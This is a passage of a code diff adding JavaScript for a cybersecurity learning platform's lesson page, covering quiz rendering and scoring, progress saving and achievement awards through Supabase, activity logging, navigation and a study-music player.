+                <div class="quiz-score pass">${savedScore}%</div>
+                <div class="quiz-message">
+                    <strong>Lesson Completed!</strong><br>
+                    You've successfully passed this lesson's quiz.
+                </div>
+            </div>
+        `;
+        } else {
+          // Render quiz questions
+          quiz.questions.forEach((question, qIndex) => {
+            quizHTML += `
+                <div class="quiz-question ${
+                  qIndex === 0 ? "active" : ""
+                }" data-question="${qIndex}">
+                    <div class="question-header">
+                        <span class="question-number">Question ${
+                          qIndex + 1
+                        }</span>
+                        <span class="question-progress">${qIndex + 1}/${
+              quiz.questions.length
+            }</span>
+                    </div>
+                    <div class="question-text">${question.question}</div>
+                    <div class="question-options">
+                        ${question.options
+                          .map(
+                            (option, oIndex) => `
+                            <div class="option" data-option="${oIndex}" onclick="selectOption(${qIndex}, ${oIndex})">
+                                <span class="option-letter">${String.fromCharCode(
+                                  65 + oIndex
+                                )}</span>
+                                <span class="option-text">${option}</span>
+                            </div>
+                        `
+                          )
+                          .join("")}
+                    </div>
+                </div>
+            `;
+          });
+
+          quizHTML += `
+            <div class="quiz-controls">
+                <button class="btn btn-secondary" id="prevQuestionBtn" onclick="previousQuestion()" disabled>
+                    <i class="fas fa-chevron-left"></i>
+                    Previous
+                </button>
+                <div>
+                    <button class="btn btn-secondary" id="nextQuestionBtn" onclick="nextQuestion()" disabled>
+                        Next
+                        <i class="fas fa-chevron-right"></i>
+                    </button>
+                    <button class="btn btn-primary" id="submitQuizBtn" onclick="submitQuiz()" style="display: none;">
+                        <i class="fas fa-check"></i>
+                        Submit Quiz
+                    </button>
+                </div>
+            </div>
+
+            <div class="quiz-results" id="quizResults">
+                <div class="quiz-score" id="quizScore">0%</div>
+                <div class="quiz-message" id="quizMessage"></div>
+                <div class="quiz-actions">
+                    <button class="btn btn-primary" id="continueBtn" onclick="completeLesson()" style="display: none;">
+                        <i class="fas fa-arrow-right"></i>
+                        Continue to Next Lesson
+                    </button>
+                    <button class="btn btn-secondary" onclick="retakeQuiz()">
+                        <i class="fas fa-redo"></i>
+                        Retake Quiz
+                    </button>
+                </div>
+            </div>
+        `;
+        }
+
+        quizHTML += "</div>";
+        return quizHTML;
+      }
+
+      // Quiz interaction functions
+      function selectOption(questionIndex, optionIndex) {
+        // Clear previous selections
+        document
+          .querySelectorAll(`[data-question="${questionIndex}"] .option`)
+          .forEach((opt) => {
+            opt.classList.remove("selected");
+          });
+
+        // Select current option
+        const selectedOption = document.querySelector(
+          `[data-question="${questionIndex}"] [data-option="${optionIndex}"]`
+        );
+        selectedOption.classList.add("selected");
+
+        // Store answer
+        quizState.answers[questionIndex] = optionIndex;
+
+        // Update navigation
+        const isLastQuestion =
+          questionIndex ===
+          COURSE_DATA.lessons[currentLessonIndex].quiz.questions.length - 1;
+        if (isLastQuestion) {
+          document.getElementById("submitQuizBtn").style.display =
+            "inline-flex";
+          document.getElementById("nextQuestionBtn").style.display = "none";
+        } else {
+          document.getElementById("nextQuestionBtn").disabled = false;
+        }
+      }
+
+      function nextQuestion() {
+        const currentQuestionEl = document.querySelector(
+          ".quiz-question.active"
+        );
+        const nextQuestionEl = currentQuestionEl.nextElementSibling;
+
+        if (
+          nextQuestionEl &&
+          nextQuestionEl.classList.contains("quiz-question")
+        ) {
+          currentQuestionEl.classList.remove("active");
+          nextQuestionEl.classList.add("active");
+          quizState.currentQuestion++;
+          updateQuizNavigation();
+        }
+      }
+
+      function previousQuestion() {
+        const currentQuestionEl = document.querySelector(
+          ".quiz-question.active"
+        );
+        const prevQuestionEl = currentQuestionEl.previousElementSibling;
+
+        if (
+          prevQuestionEl &&
+          prevQuestionEl.classList.contains("quiz-question")
+        ) {
+          currentQuestionEl.classList.remove("active");
+          prevQuestionEl.classList.add("active");
+          quizState.currentQuestion--;
+          updateQuizNavigation();
+        }
+      }
+
+      function updateQuizNavigation() {
+        const totalQuestions =
+          COURSE_DATA.lessons[currentLessonIndex].quiz.questions.length;
+        const prevBtn = document.getElementById("prevQuestionBtn");
+        const nextBtn = document.getElementById("nextQuestionBtn");
+        const submitBtn = document.getElementById("submitQuizBtn");
+
+        prevBtn.disabled = quizState.currentQuestion === 0;
+
+        const hasAnswer =
+          quizState.answers[quizState.currentQuestion] !== undefined;
+        const isLastQuestion = quizState.currentQuestion === totalQuestions - 1;
+
+        if (isLastQuestion) {
+          nextBtn.style.display = "none";
+          submitBtn.style.display = hasAnswer ? "inline-flex" : "none";
+        } else {
+          nextBtn.style.display = "inline-flex";
+          nextBtn.disabled = !hasAnswer;
+          submitBtn.style.display = "none";
+        }
+      }
+
+      async function submitQuiz() {
+        const lesson = COURSE_DATA.lessons[currentLessonIndex];
+        const quiz = lesson.quiz;
+        let correctAnswers = 0;
+
+        // Hide questions and controls
+        document
+          .querySelectorAll(".quiz-question")
+          .forEach((q) => (q.style.display = "none"));
+        document.querySelector(".quiz-controls").style.display = "none";
+
+        // Calculate score and highlight answers
+        quiz.questions.forEach((question, index) => {
+          const userAnswer = quizState.answers[index];
+          const correctAnswer = question.correct;
+          const isCorrect = userAnswer === correctAnswer;
+
+          if (isCorrect) correctAnswers++;
+
+          // Highlight answers
+          const questionEl = document.querySelector(
+            `[data-question="${index}"]`
+          );
+          const options = questionEl.querySelectorAll(".option");
+
+          options[correctAnswer].classList.add("correct");
+          if (userAnswer !== correctAnswer && userAnswer !== undefined) {
+            options[userAnswer].classList.add("incorrect");
+          }
+        });
+
+        const score = Math.round(
+          (correctAnswers / quiz.questions.length) * 100
+        );
+        const passed = score >= quiz.passingScore;
+
+        // Update quiz results UI
+        const quizScore = document.getElementById("quizScore");
+        const quizMessage = document.getElementById("quizMessage");
+        const quizActions = document.querySelector(".quiz-actions");
+
+        quizScore.textContent = `${score}%`;
+        quizScore.className = `quiz-score ${passed ? "pass" : "fail"}`;
+
+        if (passed) {
+          quizMessage.innerHTML = `
+            <strong>Congratulations!</strong><br>
+            You passed with ${score}%. You can now proceed to the next lesson.
+        `;
+
+          quizActions.innerHTML = `
+            <button class="btn btn-primary" onclick="completeLesson()">
+                <i class="fas fa-arrow-right"></i>
+                Continue to Next Lesson
+            </button>
+        `;
+
+          // Mark lesson as completed
+          await markLessonComplete(score);
+        } else {
+          quizMessage.innerHTML = `
+            <strong>Not quite there yet.</strong><br>
+            You scored ${score}%. You need ${quiz.passingScore}% to pass. Review the material and try again.
+        `;
+
+          quizActions.innerHTML = `
+            <button class="btn btn-secondary" onclick="retakeQuiz()">
+                <i class="fas fa-redo"></i>
+                Retake Quiz
+            </button>
+        `;
+        }
+
+        document.getElementById("quizResults").classList.add("show");
+
+        // Log quiz completion
+        logUserActivity("quiz_completed", {
+          lesson_id: lesson.id,
+          lesson_title: lesson.title,
+          score: score,
+          passed: passed,
+          attempts: (courseProgress[lesson.id]?.quizAttempts || 0) + 1,
+        });
+
+        // Scroll to results
+        document
+          .getElementById("quizResults")
+          .scrollIntoView({ behavior: "smooth" });
+      }
+
+      function retakeQuiz() {
+        // Reset quiz state
+        quizState = {
+          currentQuestion: 0,
+          answers: [],
+          score: 0,
+          isComplete: false,
+        };
+
+        // Track quiz retry
+        const lessonId = COURSE_DATA.lessons[currentLessonIndex].id;
+        if (!courseProgress[lessonId]) courseProgress[lessonId] = {};
+        courseProgress[lessonId].quizAttempts =
+          (courseProgress[lessonId].quizAttempts || 0) + 1;
+
+        // Reload lesson content
+        loadLesson(currentLessonIndex);
+
+        // Scroll to quiz
+        setTimeout(() => {
+          document
+            .getElementById("quizSection")
+            .scrollIntoView({ behavior: "smooth" });
+        }, 500);
+      }
+
+      async function markLessonComplete(score) {
+        const lesson = COURSE_DATA.lessons[currentLessonIndex];
+        const lessonId = lesson.id;
+
+        // Track lesson completion time
+        trackLessonTime();
+
+        // Update lesson progress
+        courseProgress[lessonId] = {
+          ...courseProgress[lessonId],
+          completed: true,
+          quizScore: score,
+          completedAt: new Date().toISOString(),
+          finalScore: score,
+        };
+
+        // Update session tracking
+        courseSession.lessonsCompleted++;
+
+        // Save progress to database
+        await saveProgress();
+
+        // Update UI
+        renderSidebar();
+        updateNavigationButtons();
+
+        // Check various achievements
+        await checkLessonCompletionAchievements();
+        await checkPerfectScoreAchievements(score);
+        await checkStudyTimeAchievements();
+
+        // Log lesson completion
+        logUserActivity("lesson_completed", {
+          lesson_id: lessonId,
+          lesson_title: lesson.title,
+          final_score: score,
+          time_spent: courseProgress[lessonId].timeSpent || 0,
+          lesson_number: currentLessonIndex + 1,
+        });
+
+        showToast("Lesson completed successfully!", "success");
+      }
+
+      async function completeLesson() {
+        if (currentLessonIndex < COURSE_DATA.lessons.length - 1) {
+          // Move to next lesson
+          currentLessonIndex++;
+          loadLesson(currentLessonIndex);
+        } else {
+          // Course completion
+          await completeCourse();
+        }
+      }
+
+      async function completeCourse() {
+        try {
+          const completionTime = courseSession.totalStudyTime;
+
+          // Update course progress to 100% completed
+          await supabase
+            .from("course_progress")
+            .update({
+              progress: 100,
+              completed_at: new Date().toISOString(),
+              completion_time_minutes: completionTime,
+            })
+            .eq("user_id", currentUser.id)
+            .eq("course_id", COURSE_DATA.id);
+
+          // Award course completion achievements
+          await checkAndUnlockAchievement("course_completion_1");
+          await checkSpeedCompletionAchievements(completionTime);
+          await checkCourseStreakAchievements();
+
+          // Update user stats
+          await updateUserStats();
+
+          // Show completion message
+          showToast(
+            "Congratulations! Course completed successfully!",
+            "certificate"
+          );
+
+          // Log course completion
+          logUserActivity("course_completed", {
+            course_id: COURSE_DATA.id,
+            course_title: COURSE_DATA.title,
+            completion_time_minutes: completionTime,
+            total_lessons: COURSE_DATA.lessons.length,
+            average_quiz_score: calculateAverageQuizScore(),
+          });
+
+          // Redirect to dashboard after delay
+          setTimeout(() => {
+            window.location.href = "/dashboard";
+          }, 3000);
+        } catch (error) {
+          console.error("Error completing course:", error);
+          showToast("Error marking course as complete", "error");
+        }
+      }
+
+      // =====================================================
+      // ACHIEVEMENT INTEGRATION SYSTEM
+      // =====================================================
+      async function checkAndUnlockAchievement(
+        achievementId,
+        skipNotification = false
+      ) {
+        try {
+          // Prevent duplicate checks
+          const cacheKey = `achievement_${achievementId}_${currentUser.id}`;
+          if (sessionStorage.getItem(cacheKey)) return false;
+
+          // Check if already unlocked
+          const { data: existing, error } = await supabase
+            .from("user_achievements")
+            .select("id")
+            .eq("user_id", currentUser.id)
+            .eq("achievement_id", achievementId)
+            .single();
+
+          if (existing) {
+            sessionStorage.setItem(cacheKey, "true");
+            return false;
+          }
+
+          // Award achievement
+          const achievementData = {
+            user_id: currentUser.id,
+            achievement_id: achievementId,
+            unlocked_at: new Date().toISOString(),
+            points_awarded: getAchievementPoints(achievementId),
+            context: "course_system",
+          };
+
+          const { data, error: insertError } = await supabase
+            .from("user_achievements")
+            .insert([achievementData])
+            .select()
+            .single();
+
+          if (insertError) {
+            if (insertError.code === "23505") return false; // Already exists
+            throw insertError;
+          }
+
+          // Update user points
+         await supabase.rpc('increment_user_stats', {
+  user_id_param: currentUser.id,
+  points_to_add: achievementData.points_awarded,
+  achievements_to_add: 1
+});
+
+          // Cache and queue notification
+          sessionStorage.setItem(cacheKey, "true");
+
+          if (!skipNotification) {
+            queueAchievementNotification({
+              id: achievementId,
+              name: getAchievementName(achievementId),
+              description: getAchievementDescription(achievementId),
+              points: achievementData.points_awarded,
+              rarity: getAchievementRarity(achievementId),
+              icon: getAchievementIcon(achievementId),
+            });
+          }
+
+          return true;
+        } catch (error) {
+          console.error("Error unlocking achievement:", error);
+          return false;
+        }
+      }
+
+      // Helper functions for achievement data (replace with your actual achievement definitions)
+      function getAchievementPoints(id) {
+        const pointsMap = {
+          first_course_start: 75,
+          first_lesson: 100,
+          course_completion_1: 500,
+          perfect_score: 250,
+          speed_demon: 750,
+          marathon_learner: 500,
+          night_owl: 200,
+          early_bird: 200,
+          weekend_warrior: 150,
+          // Add more as needed
+        };
+        return pointsMap[id] || 100;
+      }
+
+      function getAchievementName(id) {
+        const nameMap = {
+          first_course_start: "Learning Initiated",
+          first_lesson: "First Steps",
+          course_completion_1: "Course Conqueror",
+          perfect_score: "Perfectionist",
+          speed_demon: "Speed Demon",
+          // Add more as needed
+        };
+        return nameMap[id] || "Achievement Unlocked";
+      }
+
+      function getAchievementDescription(id) {
+        const descMap = {
+          first_course_start: "Start your first cybersecurity course",
+          first_lesson: "Complete your first lesson",
+          course_completion_1: "Complete your first course",
+          perfect_score: "Score 100% on any quiz",
+          speed_demon: "Complete a course in under 2 hours",
+          // Add more as needed
+        };
+        return descMap[id] || "Achievement description";
+      }
+
+      function getAchievementRarity(id) {
+        const rarityMap = {
+          first_course_start: "common",
+          first_lesson: "bronze",
+          course_completion_1: "silver",
+          perfect_score: "gold",
+          speed_demon: "legendary",
+          // Add more as needed
+        };
+        return rarityMap[id] || "common";
+      }
+
+      function getAchievementIcon(id) {
+        const iconMap = {
+          first_course_start: "fas fa-play",
+          first_lesson: "fas fa-baby",
+          course_completion_1: "fas fa-trophy",
+          perfect_score: "fas fa-star",
+          speed_demon: "fas fa-rocket",
+          // Add more as needed
+        };
+        return iconMap[id] || "fas fa-award";
+      }
+
+      async function checkLessonAchievements(lessonNumber) {
+        if (lessonNumber === 1) {
+          await checkAndUnlockAchievement("first_lesson");
+        }
+
+        // Check if user has completed multiple lessons in one day
+        const today = new Date().toISOString().split("T")[0];
+        const todayCompletions = Object.values(courseProgress).filter(
+          (p) => p.completed && p.completedAt?.startsWith(today)
+        ).length;
+
+        if (todayCompletions >= 3) {
+          await checkAndUnlockAchievement("lesson_marathon");
+        }
+      }
+
+      async function checkLessonCompletionAchievements() {
+        const completedCount = getCompletedLessonsCount();
+
+        // Lesson-based achievements
+        const lessonMilestones = [1, 5, 10, 25, 50, 100];
+        for (const milestone of lessonMilestones) {
+          if (completedCount >= milestone) {
+            await checkAndUnlockAchievement(`lessons_${milestone}`);
+          }
+        }
+
+        // Course completion achievements
+        if (completedCount === COURSE_DATA.lessons.length) {
+          await checkAndUnlockAchievement("course_completion_1");
+
+          // Check for additional course completion achievements
+          const { data: allCourses } = await supabase
+            .from("course_progress")
+            .select("course_id")
+            .eq("user_id", currentUser.id)
+            .eq("progress", 100);
+
+          const totalCompleted = allCourses?.length || 0;
+
+          const courseMilestones = [1, 5, 10, 25];
+          for (const milestone of courseMilestones) {
+            if (totalCompleted >= milestone) {
+              await checkAndUnlockAchievement(`course_completion_${milestone}`);
+            }
+          }
+        }
+      }
+
+      async function checkPerfectScoreAchievements(score) {
+        if (score === 100) {
+          await checkAndUnlockAchievement("perfect_score");
+
+          // Check for consecutive perfect scores
+          const recentScores = Object.values(courseProgress)
+            .filter((p) => p.completed && p.quizScore)
+            .slice(-5) // Last 5 completed
+            .map((p) => p.quizScore);
+
+          if (
+            recentScores.length >= 3 &&
+            recentScores.every((s) => s === 100)
+          ) {
+            await checkAndUnlockAchievement("perfectionist_streak");
+          }
+        }
+      }
+
+      async function checkSpeedCompletionAchievements(completionTime) {
+        // Speed demon: Complete course in under 2 hours (120 minutes)
+        if (completionTime <= 120) {
+          await checkAndUnlockAchievement("speed_demon");
+        }
+
+        // Quick learner: Complete course in under 4 hours (240 minutes)
+        if (completionTime <= 240) {
+          await checkAndUnlockAchievement("quick_learner");
+        }
+      }
+
+      async function checkStudyTimeAchievements() {
+        const totalTime = courseSession.totalStudyTime;
+
+        // Marathon learner: Study for 8+ hours in a course session
+        if (totalTime >= 480) {
+          // 8 hours
+          await checkAndUnlockAchievement("marathon_learner");
+        }
+
+        // Dedicated learner: Study for 4+ hours
+        if (totalTime >= 240) {
+          // 4 hours
+          await checkAndUnlockAchievement("dedicated_learner");
+        }
+      }
+
+      async function checkCourseStreakAchievements() {
+        try {
+          // Check for consecutive course completions
+          const { data: recentCourses, error } = await supabase
+            .from("course_progress")
+            .select("completed_at, course_id")
+            .eq("user_id", currentUser.id)
+            .eq("progress", 100)
+            .order("completed_at", { ascending: false })
+            .limit(10);
+
+          if (error || !recentCourses) return;
+
+          // Check for courses completed on consecutive days
+          let consecutiveDays = 1;
+          for (let i = 1; i < recentCourses.length; i++) {
+            const prevDate = new Date(
+              recentCourses[i - 1].completed_at
+            ).toDateString();
+            const currentDate = new Date(
+              recentCourses[i].completed_at
+            ).toDateString();
+            const dayDiff =
+              Math.abs(new Date(prevDate) - new Date(currentDate)) /
+              (1000 * 60 * 60 * 24);
+
+            if (dayDiff <= 1) {
+              consecutiveDays++;
+            } else {
+              break;
+            }
+          }
+
+          if (consecutiveDays >= 3) {
+            await checkAndUnlockAchievement("learning_streak");
+          }
+        } catch (error) {
+          console.error("Error checking course streak achievements:", error);
+        }
+      }
+
+      // =====================================================
+      // TIME-BASED ACHIEVEMENTS
+      // =====================================================
+      async function checkTimeBasedAchievements(timestamp) {
+        const hour = timestamp.getHours();
+        const dayOfWeek = timestamp.getDay();
+
+        // Night owl (after midnight, before 6 AM)
+        if (hour >= 0 && hour < 6) {
+          await incrementTimeBasedCounter("midnight_sessions", "night_owl");
+        }
+
+        // Early bird (4 AM to 6 AM)
+        if (hour >= 4 && hour < 6) {
+          await incrementTimeBasedCounter("early_sessions", "early_bird");
+        }
+
+        // Weekend warrior (Saturday = 6, Sunday = 0)
+        if (dayOfWeek === 0 || dayOfWeek === 6) {
+          await incrementTimeBasedCounter(
+            "weekend_sessions",
+            "weekend_warrior"
+          );
+        }
+      }
+
+      async function incrementTimeBasedCounter(counterType, achievementId) {
+        try {
+          const dateStr = new Date().toISOString().split("T")[0];
+          const cacheKey = `${counterType}_${currentUser.id}_${dateStr}`;
+
+          // Prevent multiple increments per day
+          if (sessionStorage.getItem(cacheKey)) return;
+
+          // Update counter
+       await supabase.rpc('increment_profile_counter', {
+  user_id_param: currentUser.id,
+  counter_field: counterType,
+  increment_value: 1
+});
+
+          // Cache to prevent double counting
+          sessionStorage.setItem(cacheKey, "true");
+
+          // Check related achievement
+          if (achievementId) {
+            await checkAndUnlockAchievement(achievementId, true);
+          }
+        } catch (error) {
+          console.error(`Error incrementing ${counterType}:`, error);
+        }
+      }
+
+      async function checkDailyStreak() {
+        try {
+          const { data: profile, error } = await supabase
+            .from("profiles")
+            .select("last_activity, current_streak, last_streak_date")
+            .eq("id", currentUser.id)
+            .single();
+
+          if (error) throw error;
+
+          const now = new Date();
+          const today = now.toDateString();
+          const lastActivity = profile.last_activity
+            ? new Date(profile.last_activity)
+            : null;
+          const lastStreakDate = profile.last_streak_date
+            ? new Date(profile.last_streak_date).toDateString()
+            : null;
+
+          let newStreak = profile.current_streak || 0;
+          let shouldUpdateStreak = false;
+
+          if (!lastActivity) {
+            // First time user
+            newStreak = 1;
+            shouldUpdateStreak = true;
+          } else {
+            const daysSinceLastActivity = Math.floor(
+              (now - lastActivity) / (1000 * 60 * 60 * 24)
+            );
+
+            if (lastStreakDate === today) {
+              // Already counted today's streak
+              return newStreak;
+            } else if (
+              daysSinceLastActivity === 1 ||
+              (daysSinceLastActivity === 0 && lastStreakDate !== today)
+            ) {
+              // Consecutive day or same day but not counted yet
+              newStreak += 1;
+              shouldUpdateStreak = true;
+            } else if (daysSinceLastActivity > 1) {
+              // Streak broken
+              newStreak = 1;
+              shouldUpdateStreak = true;
+            }
+          }
+
+          if (shouldUpdateStreak) {
+            await supabase
+              .from("profiles")
+              .update({
+                current_streak: newStreak,
+                last_activity: now.toISOString(),
+                last_streak_date: now.toISOString(),
+              })
+              .eq("id", currentUser.id);
+
+            userStats.current_streak = newStreak;
+
+            showToast(`Daily streak: ${newStreak} days!`, "success");
+            await checkStreakAchievements(newStreak);
+          }
+
+          return newStreak;
+        } catch (error) {
+          console.error("Error checking daily streak:", error);
+          return 0;
+        }
+      }
+
+      async function checkStreakAchievements(currentStreak) {
+        const streakMilestones = [3, 7, 14, 30, 100, 365];
+
+        for (const milestone of streakMilestones) {
+          if (currentStreak >= milestone) {
+            await checkAndUnlockAchievement(`streak_${milestone}`);
+          }
+        }
+      }
+
+      // =====================================================
+      // USER ACTIVITY LOGGING
+      // =====================================================
+      async function logUserActivity(activityType, metadata = {}) {
+        try {
+          const now = new Date();
+
+          const activityData = {
+            user_id: currentUser.id,
+            activity_type: activityType,
+            timestamp: now.toISOString(),
+            course_id: COURSE_DATA.id,
+            lesson_index: currentLessonIndex,
+            session_duration: courseSession.totalStudyTime,
+            metadata: JSON.stringify(metadata),
+            created_at: now.toISOString(),
+          };
+
+          // Try to log to activities table
+          const { error } = await supabase
+            .from("user_activities")
+            .insert([activityData]);
+
+          if (error && error.code !== "42P01") {
+            console.warn("Activity logging failed:", error.message);
+          }
+
+          // Always update last activity in profile
+          await supabase
+            .from("profiles")
+            .update({ last_activity: now.toISOString() })
+            .eq("id", currentUser.id);
+        } catch (error) {
+          console.error("Error logging user activity:", error);
+        }
+      }
+
+      // =====================================================
+      // NAVIGATION SYSTEM
+      // =====================================================
+      function updateNavigationButtons() {
+        const prevBtn = document.getElementById("prevLessonBtn");
+        const nextBtn = document.getElementById("nextLessonBtn");
+
+        if (!prevBtn || !nextBtn) return;
+
+        // Previous button
+        prevBtn.disabled = currentLessonIndex === 0;
+
+        // Next button logic
+        const isLastLesson =
+          currentLessonIndex === COURSE_DATA.lessons.length - 1;
+        const canGoNext =
+          currentLessonIndex < COURSE_DATA.lessons.length - 1 &&
+          canAccessLesson(currentLessonIndex + 1);
+
+        if (isLastLesson) {
+          const isCurrentCompleted =
+            courseProgress[COURSE_DATA.lessons[currentLessonIndex].id]
+              ?.completed;
+          nextBtn.disabled = !isCurrentCompleted;
+          nextBtn.innerHTML = '<i class="fas fa-trophy"></i> Complete Course';
+        } else {
+          nextBtn.disabled = !canGoNext;
+          nextBtn.innerHTML = 'Next <i class="fas fa-chevron-right"></i>';
+        }
+      }
+
+      // Navigation button event handlers
+      function goToPreviousLesson() {
+        if (currentLessonIndex > 0) {
+          trackLessonTime(); // Track time spent on current lesson
+          currentLessonIndex--;
+          loadLesson(currentLessonIndex);
+        }
+      }
+
+      function goToNextLesson() {
+        if (currentLessonIndex < COURSE_DATA.lessons.length - 1) {
+          const canGoNext = canAccessLesson(currentLessonIndex + 1);
+          if (canGoNext) {
+            trackLessonTime();
+            currentLessonIndex++;
+            loadLesson(currentLessonIndex);
+          } else {
+            showToast("Complete the current lesson quiz to proceed", "warning");
+          }
+        } else {
+          // Complete course
+          completeCourse();
+        }
+      }
+
+      // =====================================================
+      // SIDEBAR FUNCTIONS
+      // =====================================================
+      function toggleSidebar() {
+        const sidebar = document.getElementById("sidebar");
+        const overlay = document.getElementById("sidebarOverlay");
+
+        if (sidebar) sidebar.classList.toggle("open");
+        if (overlay) overlay.classList.toggle("active");
+      }
+
+      function closeSidebar() {
+        const sidebar = document.getElementById("sidebar");
+        const overlay = document.getElementById("sidebarOverlay");
+
+        if (sidebar) sidebar.classList.remove("open");
+        if (overlay) overlay.classList.remove("active");
+      }
+
+      // =====================================================
+      // ACHIEVEMENT NOTIFICATION SYSTEM
+      // =====================================================
+      function queueAchievementNotification(achievement) {
+        notificationQueue.push(achievement);
+        processNotificationQueue();
+      }
+
+      function processNotificationQueue() {
+        if (isShowingNotification || notificationQueue.length === 0) return;
+
+        isShowingNotification = true;
+        const achievement = notificationQueue.shift();
+        showAchievementNotification(achievement);
+
+        const duration =
+          achievement.rarity === "mythic"
+            ? 8000
+            : achievement.rarity === "legendary"
+            ? 7000
+            : 6000;
+
+        setTimeout(() => {
+          isShowingNotification = false;
+          processNotificationQueue();
+        }, duration + 500);
+      }
+
+      function showAchievementNotification(achievement) {
+        const notification = document.getElementById("achievementNotification");
+        if (!notification) return;
+
+        const icon = document.getElementById("notificationIcon");
+        const title = document.getElementById("notificationTitle");
+        const description = document.getElementById("notificationDescription");
+        const points = document.getElementById("notificationPoints");
+
+        if (icon) {
+          icon.innerHTML = `<i class="${achievement.icon}"></i>`;
+          icon.className = `notification-icon ${achievement.rarity}`;
+        }
+        if (title) title.textContent = achievement.name;
+        if (description) description.textContent = achievement.description;
+        if (points) points.textContent = `+${achievement.points} Points`;
+
+        notification.className = `achievement-notification ${achievement.rarity}`;
+        notification.classList.add("show");
+
+        const duration =
+          achievement.rarity === "mythic"
+            ? 8000
+            : achievement.rarity === "legendary"
+            ? 7000
+            : 6000;
+
+        setTimeout(() => {
+          notification.classList.remove("show");
+        }, duration);
+      }
+
+      // =====================================================
+      // UTILITY FUNCTIONS
+      // =====================================================
+      function calculateAverageQuizScore() {
+        const scores = Object.values(courseProgress)
+          .filter((p) => p.completed && p.quizScore)
+          .map((p) => p.quizScore);
+
+        if (scores.length === 0) return 0;
+        return Math.round(
+          scores.reduce((sum, score) => sum + score, 0) / scores.length
+        );
+      }
+
+      async function resetProgress() {
+        if (
+          !confirm(
+            "Are you sure you want to reset your progress? This action cannot be undone."
+          )
+        ) {
+          return;
+        }
+
+        try {
+          // Track lesson time before reset
+          trackLessonTime();
+
+          // Reset local state
+          courseProgress = {};
+          currentLessonIndex = 0;
+          courseSession = {
+            startTime: new Date(),
+            totalStudyTime: 0,
+            lessonsStarted: 0,
+            lessonsCompleted: 0,
+            pageLoadTime: new Date(),
+            interactionCount: 0,
+            lastActivityTime: new Date(),
+          };
+
+          // Delete from database
+          await supabase
+            .from("course_progress")
+            .delete()
+            .eq("user_id", currentUser.id)
+            .eq("course_id", COURSE_DATA.id);
+
+          // Log reset activity
+          logUserActivity("progress_reset", {
+            course_id: COURSE_DATA.id,
+            reset_reason: "manual",
+          });
+
+          // Reinitialize
+          await saveProgress();
+          renderSidebar();
+          loadLesson(0);
+
+          showToast("Progress reset successfully", "success");
+        } catch (error) {
+          console.error("Error resetting progress:", error);
+          showToast("Failed to reset progress", "error");
+        }
+      }
+
+      function copyCode(codeId) {
+        const codeElement = document.getElementById(codeId);
+        if (!codeElement) return;
+
+        const text = codeElement.textContent;
+
+        navigator.clipboard
+          .writeText(text)
+          .then(() => {
+            showToast("Code copied to clipboard!", "success");
+
+            // Track code copy for achievements
+            logUserActivity("code_copied", {
+              code_section: codeId,
+              lesson_id: COURSE_DATA.lessons[currentLessonIndex].id,
+            });
+          })
+          .catch((err) => {
+            console.error("Failed to copy code:", err);
+            showToast("Failed to copy code", "error");
+
+            // Fallback for older browsers
+            const textArea = document.createElement("textarea");
+            textArea.value = text;
+            document.body.appendChild(textArea);
+            textArea.select();
+            try {
+              document.execCommand("copy");
+              showToast("Code copied to clipboard!", "success");
+            } catch (fallbackError) {
+              showToast(
+                "Copy failed - please select and copy manually",
+                "error"
+              );
+            }
+            document.body.removeChild(textArea);
+          });
+      }
+
+      function escapeHtml(text) {
+        const div = document.createElement("div");
+        div.textContent = text;
+        return div.innerHTML;
+      }
+
+      // =====================================================
+      // UI FEEDBACK SYSTEMS
+      // =====================================================
+      function showToast(message, type = "success") {
+        const toast = document.getElementById("toast");
+        const messageEl = document.getElementById("toastMessage");
+
+        if (!toast || !messageEl) {
+          console.log(`Toast: ${message} (${type})`);
+          return;
+        }
+
+        messageEl.textContent = message;
+        toast.className = `toast ${type} show`;
+
+        setTimeout(() => {
+          toast.classList.remove("show");
+        }, 4000);
+      }
+
+      function showLoadingScreen() {
+        const loadingScreen = document.getElementById("loadingScreen");
+        if (loadingScreen) loadingScreen.classList.remove("hidden");
+      }
+
+      function hideLoadingScreen() {
+        const loadingScreen = document.getElementById("loadingScreen");
+        if (loadingScreen) {
+          setTimeout(() => {
+            loadingScreen.classList.add("hidden");
+          }, 1000);
+        }
+      }
+
+      // =====================================================
+      // MUSIC PLAYER INTEGRATION
+      // =====================================================
+      function initMusicPlayer() {
+        const btnText = document.getElementById("music-button-text");
+        const icon = document.getElementById("music-icon");
+        const dropdown = document.getElementById("music-dropdown-content");
+
+        if (!btnText || !icon || !dropdown) return;
+
+        function setUI(state) {
+          btnText.textContent =
+            state === "Playing" ? "PAUSE MUSIC" : "STUDY MUSIC";
+          icon.className =
+            state === "Playing"
+              ? "fa-solid fa-circle-pause"
+              : "fa-solid fa-music";
+        }
+
+        // Load saved music state
+        const savedSrc = localStorage.getItem("cybersec_music_src");
+        const savedTime = parseFloat(
+          localStorage.getItem("cybersec_music_time") || 0
+        );
+
+        if (savedSrc) {
+          audioPlayer.src = savedSrc;
+          audioPlayer.currentTime = savedTime;
+          audioPlayer
+            .play()
+            .then(() => setUI("Playing"))
+            .catch(() => setUI("Stopped"));
+        }
+
+        // Music button click handler
+        document
+          .getElementById("music-dropdown")
+          .querySelector("button")
+          .addEventListener("click", (e) => {
+            e.stopPropagation();
+            dropdown.style.display =
+              dropdown.style.display === "block" ? "none" : "block";
+
+            if (audioPlayer.src && !audioPlayer.paused) {
+              audioPlayer.pause();
+              setUI("Stopped");
+            } else if (audioPlayer.src) {
+              audioPlayer.play().then(() => setUI("Playing"));
+            }
+          });
+
+        // Music selection handlers
+        dropdown.querySelectorAll("a[data-src]").forEach((link) => {
+          link.addEventListener("click", (e) => {
+            e.preventDefault();
+            audioPlayer.src = link.dataset.src;
+            audioPlayer.play().then(() => setUI("Playing"));
+            localStorage.setItem("cybersec_music_src", link.dataset.src);
+            dropdown.style.display = "none";
+          });
+        });
+
+        // Stop music handler
+        const stopLink = document.getElementById("stop-music-link");
+        if (stopLink) {
+          stopLink.addEventListener("click", (e) => {
+            e.preventDefault();
+            audioPlayer.pause();
+            audioPlayer.currentTime = 0;
+            audioPlayer.removeAttribute("src");
+            setUI("Stopped");
+            localStorage.removeItem("cybersec_music_src");
+            localStorage.removeItem("cybersec_music_time");
+            dropdown.style.display = "none";
+          });
+        }
+
+        // Save music state before page unload
+        window.addEventListener("beforeunload", () => {
+          if (!audioPlayer.paused && audioPlayer.src) {
+            localStorage.setItem("cybersec_music_src", audioPlayer.src);
+            localStorage.setItem(
+              "cybersec_music_time",
+              audioPlayer.currentTime
+            );
+          }
+        });
+
+        // Close dropdown when clicking outside
